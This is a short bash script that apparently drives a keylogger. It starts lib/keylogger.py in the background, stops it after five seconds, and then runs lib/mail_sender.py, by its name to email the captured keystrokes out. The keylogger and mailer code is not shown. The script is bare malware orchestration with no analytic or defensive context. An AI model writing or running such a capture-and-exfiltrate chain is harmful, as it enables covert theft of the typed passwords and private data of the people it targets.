#!/bin/bash

python lib/keylogger.py &
PID=$(echo $!)
sleep 5
kill $PID

python lib/mail_sender.py
